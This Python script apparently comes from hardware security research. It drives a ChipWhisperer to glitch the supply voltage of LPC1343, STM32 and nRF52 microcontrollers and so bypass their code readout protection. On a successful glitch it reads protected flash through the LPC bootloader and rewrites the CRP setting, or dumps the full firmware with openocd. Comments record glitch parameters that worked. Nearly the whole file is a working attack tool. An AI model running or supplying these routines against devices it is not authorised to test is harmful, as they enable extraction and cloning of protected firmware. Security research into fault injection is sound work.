# LPC Resources
# https://github.com/newaetech/chipwhisperer-jupyter/blob/dcfcba460210f1b948a646ba97ebd32d253cce69/courses/faultapp1/LPC1114_Fuse_Bypass.ipynb
# https://forum.newae.com/t/lpc1343-weird-bounces-on-my-glitch/2821
# https://ibb.co/6w6T9hL
# https://hardwear.io/netherlands-2022/presentation/bypass-NXP-LPC-family-debug-check.pdf
# https://recon.cx/2017/brussels/resources/slides/RECON-BRX-2017-Breaking_CRP_on_NXP_LPC_Microcontrollers_slides.pdf
# https://www.youtube.com/watch?v=98eqp4WmHoQ
# https://toothless.co/blog/bootloader-bypass-part1
# LPC uses CRP protection [Code Readout Protection] Levels
# STM32 uses CRP protection [Code Readout Protection] Levels
# nRF52 uses APPROTECT to protect debugging interface

import chipwhisperer as cw
import time
# import serial
import os
import subprocess
# import argparse
from collections import namedtuple
import lpc1343 as lpc1343
import external.nxpprog as nxpprog

SCOPETYPE = 'OPENADC'
PLATFORM = 'NOTHING'

class voltage_fault_injection():
    def __init__(self, _interface_option, _device_option, _reset_option, _verbose_option):
        self.interface_option = _interface_option
        self.device_option = _device_option
        self.reset_option = _reset_option
        self.verbose_option = _verbose_option

    def target_reset(self, _scope):
        _scope.io.nrst = 'low'
        time.sleep(0.05)
        _scope.io.nrst = 'high_z'
        time.sleep(0.05)

    def vglitch_reset(self, _scope, _delay=0.005):
        # Reset the glitching module.
        """
        """
        hp = _scope.io.glitch_hp
        lp = _scope.io.glitch_lp
        _scope.io.glitch_hp = False
        _scope.io.glitch_lp = False
        time.sleep(_delay)
        _scope.io.glitch_hp = hp
        _scope.io.glitch_lp = lp

    ## Function to reboot the Target MCU
    def reboot_flush(self, _scope, _reset_option):
        # global scope
        if _reset_option == 'vdd':
            _scope.io.target_pwr = False # Switch off the device
            # Wait for the AirTag to finish powering off (it has a lot of capacitance)
            # Wait for the capacitors to be discharged
            # Delay Before Powering up the Target
            # time.sleep(0.7) # There is a lot of capacitance on the AirTag, so we have to wait a bit for the powering off.
            time.sleep(0.1)
            _scope.arm()
            _scope.io.target_pwr = True # Switch on the device
        elif _reset_option == 'rst':
            _scope.io.nrst = 'low'
            time.sleep(0.1)
            _scope.arm()
            # _scope.io.nrst = 'high_z'
            if self.device_option == 'stm32':
                _scope.io.nrst = 'high' # 'high_z' caused very non-linear and slow rise to 3.3v on STM32 BluePill kit
            else:
                _scope.io.nrst = 'high_z'

    def cw_lite_init(self):
        # disable logging
        cw.set_all_log_levels(cw.logging.CRITICAL)
        # ------------------------------
        # Initiate Connection to the Chipwhisperer Lite Kit
        print("Connecting to CW_Lite.")
        scope = cw.scope()
        self.scope = scope
        try:
            if not self.scope.connectStatus:
                self.scope.con()
        except NameError:
            self.scope = cw.scope()
        print("INFO: Found ChipWhisperer😍")
        time.sleep(0.05)
        # scope.default_setup()

    def cw_lite_config(self):
        # Initializing the cwLite configurations
        self.target = cw.target(self.scope)
        # Original attack done with 100 MHz clock - can be helpful to run this
        # 2x faster to get better resolution, which seems useful for glitching certain boards.
        # But if you want to use DPA you need to leave this set to '1'
        self.freq_multiplier = 1

        #Initial Setup
        self.scope.adc.samples = 10000
        self.scope.adc.offset = 0
        self.scope.clock.adc_src = "clkgen_x1"
        self.scope.trigger.triggers = "tio4"        # Trigger on a rising edge of TIO4 (connected to DIO6)
        self.scope.adc.basic_mode = "rising_edge"
        # this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1
        self.scope.clock.clkgen_freq = 100000000 * self.freq_multiplier      # Main ChipWhisperer clock
        self.scope.glitch.clk_src = "clkgen"
        self.scope.glitch.trigger_src = "ext_single"
        self.scope.glitch.output = "enable_only"
        if self.device_option == 'lpc1343':
            self.scope.io.tio1 = "serial_rx"
            self.scope.io.tio2 = "serial_tx"
            self.scope.glitch.width = 40

            # target.baud = 38400
            # target.key_cmd = ""
            # target.go_cmd = ""
            # target.output_cmd = ""
        else:
            return 0
    def target_lock(self):
        if self.device_option == 'lpc1343':
            self.cw_lite_init()
            self.cw_lite_config()
            nxpdev = lpc1343.CWDevice(self.scope, self.target)
            # lpc1343.capture_crp(nxpdev, 0x12345678) #Same hamming weight - but locked
            nxpdev.isp_mode()
            nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)
            try:
                lpc1343.set_crp(nxpp, 0x12345678)
            except IOError as e:
                print("IOError - assumed CRP enabled. Error: " + str(e))

    def run(self):
    # def voltage_fault_injection_run(self, _interface_option, _device_option, _reset_option):
    #     global interface_option
    #     global device_option
    #     global reset_option
    #     interface_option = _interface_option
    #     device_option = _device_option
    #     reset_option = _reset_option
        #########################################################
        # Start of ChipWhisperer Lite Script

        # disable logging
        cw.set_all_log_levels(cw.logging.CRITICAL)

        # ------------------------------
        # Initiate Connection to the Chipwhisperer Lite Kit
        print("Connecting to CW_Lite.")
        self.scope = cw.scope()
        try:
            if not self.scope.connectStatus:
                self.scope.con()
        except NameError:
            self.scope = cw.scope()
        print("INFO: Found ChipWhisperer😍")
        time.sleep(0.05)
        # scope.default_setup()

        # Initializing the cwLite configurations
        if self.device_option == 'lpc1343':
            self.target = cw.target(self.scope)
            # Original attack done with 100 MHz clock - can be helpful to run this
            # 2x faster to get better resolution, which seems useful for glitching certain boards.
            # But if you want to use DPA you need to leave this set to '1'
            freq_multiplier = 1

            #Initial Setup
            self.scope.adc.samples = 10000
            self.scope.adc.offset = 0
            self.scope.clock.adc_src = "clkgen_x1"
            self.scope.trigger.triggers = "tio4"
            self.scope.io.glitch_lp = True
            self.scope.io.hs2 = None

            # this value is for CW-Lite/Pro; for CW-Husky, refer to Fault 1_1
            self.scope.glitch.width = 40
            self.scope.io.tio1 = "serial_rx"
            self.scope.io.tio2 = "serial_tx"
            self.scope.adc.basic_mode = "rising_edge"
            self.scope.clock.clkgen_freq = 100000000 * freq_multiplier
            self.scope.glitch.clk_src = "clkgen"
            self.scope.glitch.trigger_src = "ext_single"
            self.scope.glitch.output = "enable_only"

            # target.baud = 38400
            # target.key_cmd = ""
            # target.go_cmd = ""
            # target.output_cmd = ""
        else:
            self.scope.clock.clkgen_freq = 100E6
            self.scope.glitch.clk_src="clkgen"
            self.scope.glitch.output = "enable_only"
            self.scope.glitch.trigger_src = "ext_single"
            if self.reset_option == 'vdd':
                self.scope.trigger.triggers = "tio4"
                self.scope.adc.basic_mode = 'rising_edge'
                print('scope.adc.basic_mode: ' + self.scope.adc.basic_mode)
            elif self.reset_option == 'rst':
                self.scope.io.target_pwr = True
                self.scope.trigger.triggers = 'nrst' #"nrst"
                self.scope.adc.basic_mode = 'rising_edge'

            # scope.glitch.arm_timing = "before_scope" ### ????
            self.scope.io.glitch_lp = True
            self.scope.io.glitch_hp = True
            # scope.adc.samples = 1 ### ???

        # Initializing cwLite Glitch attack parameters' settings
        if self.device_option == 'lpc1343':

            Range = namedtuple("Range", ["min", "max", "step"])
            # offset_range = Range(5180*freq_multiplier, 5185*freq_multiplier, 1)
            # repeat_range = Range(7*freq_multiplier, 40*freq_multiplier, 1)

            # offset_range = Range(5162*freq_multiplier, 5170*freq_multiplier, 1)
            #####offset_range = Range(5160*freq_multiplier, 5190*freq_multiplier, 1)

            # offset_range = Range(2000*freq_multiplier, 7000*freq_multiplier, 1)   # Aggressive Test
            # Working Values:
            # Glitch offset 4897, width 101........[SUCCESS]
            # Glitch offset 4892, width 101........[SUCCESS]
            # Glitch offset 4890, width 115........[SUCCESS]
            offset_range = Range(4890*freq_multiplier, 4900*freq_multiplier, 1)

            # repeat_range = Range(7*freq_multiplier, 100*freq_multiplier, 1)
            repeat_range = Range(100, 300, 1)

            self.scope.glitch.width = 40
            self.scope.glitch.repeat = repeat_range.min


            self.gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
            self.gc.set_global_step(1)
            # self.gc.set_range("ext_offset", 4890*freq_multiplier, 4900*freq_multiplier)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
            self.gc.set_range("ext_offset", 4890*freq_multiplier, 4900*freq_multiplier)      # Time after trigger to glitch, in CW clock cycles. # successful for lpc1343
            self.gc.set_range("repeat", 100, 300)              # Length of the glitch pulse    # testing for lpc1343
        else:
            # gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["repeat", "ext_offset"])
            gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["ext_offset", "repeat"])
            gc.set_global_step(1)
            if self.device_option == 'stm32':
                # gc.set_range("ext_offset", 290000, 310000)  # Time after trigger to glitch, in CW clock cycles. # successful for nRF52833
                # gc.set_range("ext_offset", 16980, 20000)         # 160us to 200us
                gc.set_range("ext_offset", 12000, 20000)         # 160us to 200us
                # gc.set_range("repeat", 100, 8190)              # Length of the glitch pulse # Full Range from 1usec to 81.9usec
                # gc.set_range("repeat", 100, 1000)              # Length of the glitch pulse # Full Range from 1usec to 10usec
                # gc.set_range("repeat", 20, 100)              # Length of the glitch pulse # Full Range from 1usec to 10usec
                gc.set_range("repeat", 20, 200)              # Length of the glitch pulse # Full Range from 1usec to 10usec
                # gc.set_range("repeat", 80, 200)              # Length of the glitch pulse # Full Range from 1usec to 10usec
                # gc.set_range("repeat", 5000, 8190)              # Length of the glitch pulse    # successful for nRF52833
                # gc.set_range("repeat", 100, 60000)              # Length of the glitch pulse
                # gc.set_step("repeat", 50)           # repeat step is 0.5usec
                # gc.set_step("ext_offset", 50)       # offset step is 0.5usec
                # gc.set_step("repeat", 10)           # repeat step is 0.1usec
                gc.set_step("repeat", 1)           # repeat step is 0.1usec
                gc.set_step("ext_offset", 1)       # offset step is 0.1usec
            else:
                # gc.set_range("repeat", 5, 20)              # Length of the glitch pulse
                # gc.set_range("repeat", 1, 50)              # Length of the glitch pulse
                # gc.set_range("ext_offset", 102500, 104500)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_step("ext_offset", 100)
                # gc.set_step("ext_offset", 10)
                # gc.set_range("ext_offset", 103000, 104500)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("ext_offset", 103500, 104500)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("ext_offset", 104500, 104600)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("ext_offset", 105000, 105400)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("ext_offset", 106000, 107000)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("ext_offset", 116000, 117000)  # Time after trigger to glitch, in CW clock cycles.
                # gc.set_range("repeat", 12, 50)              # Length of the glitch pulse
                # gc.set_step("ext_offset", 10)
                # gc.set_step("ext_offset", 1)

                # gc.set_range("ext_offset", 103000, 107000)  # Time after trigger to glitch, in CW clock cycles.
                gc.set_range("ext_offset", 110000, 130000)  # Time after trigger to glitch, in CW clock cycles. # successful for nRF52833
                # gc.set_range("repeat", 100, 8190)              # Length of the glitch pulse
                gc.set_range("repeat", 5000, 8190)              # Length of the glitch pulse    # successful for nRF52833
                # gc.set_range("repeat", 100, 60000)              # Length of the glitch pulse
                gc.set_step("repeat", 50)
                gc.set_step("ext_offset", 50)

        # Running Glitch Attack

        if self.device_option == 'lpc1343':
            print("Attempting to glitch LPC Target")

            self.scope.io.target_pwr = False
            time.sleep(0.2)
            self.scope.io.target_pwr = True
            time.sleep(0.2)

            nxpdev = lpc1343.CWDevice(self.scope, self.target)
            nxpdev.isp_mode()

            for glitch_setting in self.gc.glitch_values():
                self.scope.glitch.ext_offset = glitch_setting[0]
                self.scope.glitch.repeat = glitch_setting[1]

                self.scope.io.nrst = 'low'
                time.sleep(0.05)
                self.scope.arm()
                self.scope.io.nrst = 'high'
                self.target.ser.flush()
                
                print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")

                time.sleep(0.05)
                try:
                    nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)

                    try:
                        data = nxpp.read_block(0, 4)            
                        print("[SUCCESS]\n")
                        print("  Glitch OK! Reading first 4K...")
                        block = None
                        #Deal with crappy ChipWhisperer serial buffer by splitting read up
                        for i in range(0, 4096, 32):
                            if block is None:
                                block = nxpp.read_block(i, 32)
                            else:
                                block += nxpp.read_block(i, 32)
                        
                        print("  Adjusting CRP...")
                        block = [ord(t) for t in block]
                        lpc1343.set_crp(nxpp, 0, block)
                        done = True
                        break

                    except IOError:
                        print("[NORMAL]")
            
                except IOError:
                    print("[FAILED]")
                    pass

            # done = False
            # while done == False:
            #     self.scope.glitch.ext_offset = offset_range.min
            #     if self.scope.glitch.repeat >= repeat_range.max:
            #         self.scope.glitch.repeat = repeat_range.min
            #     while self.scope.glitch.ext_offset < offset_range.max:

            #         self.scope.io.nrst = 'low'
            #         time.sleep(0.05)
            #         self.scope.arm()
            #         self.scope.io.nrst = 'high'
            #         self.target.ser.flush()
                    
            #         print("Glitch offset %4d, width %d........"%(self.scope.glitch.ext_offset, self.scope.glitch.repeat), end="")

            #         time.sleep(0.05)
            #         try:
            #             nxpp = nxpprog.NXP_Programmer("lpc1114", nxpdev, 12000)

            #             try:
            #                 data = nxpp.read_block(0, 4)            
            #                 print("[SUCCESS]\n")
            #                 print("  Glitch OK! Reading first 4K...")
            #                 block = None
            #                 #Deal with crappy ChipWhisperer serial buffer by splitting read up
            #                 for i in range(0, 4096, 32):
            #                     if block is None:
            #                         block = nxpp.read_block(i, 32)
            #                     else:
            #                         block += nxpp.read_block(i, 32)
                            
            #                 print("  Adjusting CRP...")
            #                 block = [ord(t) for t in block]
            #                 lpc1343.set_crp(nxpp, 0, block)
            #                 done = True
            #                 break

            #             except IOError:
            #                 print("[NORMAL]")
                
            #         except IOError:
            #             print("[FAILED]")
            #             pass
                
            #         self.scope.glitch.ext_offset += offset_range.step

            #     self.scope.glitch.repeat += repeat_range.step
        else:
            fulllog_fn = 'logs/log-' + time.strftime("%Y%m%d-%H%M%S") + '.txt'
            for glitch_setting in gc.glitch_values():
                # Prepare glitch parameters
                # scope.glitch.repeat = glitch_setting[0]
                # scope.glitch.ext_offset = glitch_setting[1]
                self.scope.glitch.ext_offset = glitch_setting[0]
                self.scope.glitch.repeat = glitch_setting[1]

                # scope.glitch.ext_offset = 102500
                # scope.glitch.repeat = 2

                # Reboot the Target & arm the scope
                self.reboot_flush(self.scope, self.reset_option)

                time.sleep(0.15)
                timestr = time.strftime("%Y%m%d-%H%M%S")
                # binfilename = 'logs/nrf52_flash' + timestr + '.bin'
                # openocd_str = 'openocd -f ./openocd/nrf52840.cfg -c "init;dump_image ' + binfilename + ' 0x0 0x80000;exit"'
                dumpfilename = 'logs/' + self.device_option + '_flashDump' + timestr + '.bin'
                if self.device_option == 'stm32':
                    openocd_str = 'openocd -f ./openocd/' + self.device_option + '_' + self.interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x8000000 0x20000;exit"'
                else:
                    openocd_str = 'openocd -f ./openocd/' + self.device_option + '_' + self.interface_option + '.cfg -c "init;dump_image ' + dumpfilename + ' 0x0 0x80000;exit"'

                print('dumpfilename: ' + dumpfilename)
                print('openocd_str: ' + openocd_str)
            
                if self.verbose_option:
                    exit_status = os.system(openocd_str)
                else:
                    # exit_status = os.system(openocd_str)
                    # result = subprocess.run(openocd_str, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    result = subprocess.run(openocd_str, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    exit_status = result.returncode

                # exit_status = 256
                fulllog = open(fulllog_fn, 'a')
                fulllog.write(openocd_str + "\n")
                # print(f"repeat: {scope.glitch.repeat}, ext_offset: {scope.glitch.ext_offset}")
                print(f"ext_offset: {self.scope.glitch.ext_offset}, repeat: {self.scope.glitch.repeat}")
                print("exit_status: " + str(exit_status))
                print("*-----------------------------------*")
                if exit_status == 0:
                    print("SUCCESS")
                    filename = 'log-' + timestr + '.txt'
                    f = open(filename, 'a')
                    f.write(f"SUCCESS Paramters: repeat: {self.scope.glitch.repeat}, ext_offset: {self.scope.glitch.ext_offset}\n")
                    f.close()
                    fulllog.write(f"SUCCESS Paramters: repeat: {self.scope.glitch.repeat}, ext_offset: {self.scope.glitch.ext_offset}\n")
                    fulllog.close()
                    break
                else:
                    os.system('rm ' + dumpfilename)
                # Reset the glitching module. Things break if you don't do this.
                time.sleep(0.05)
                self.vglitch_reset(self.scope)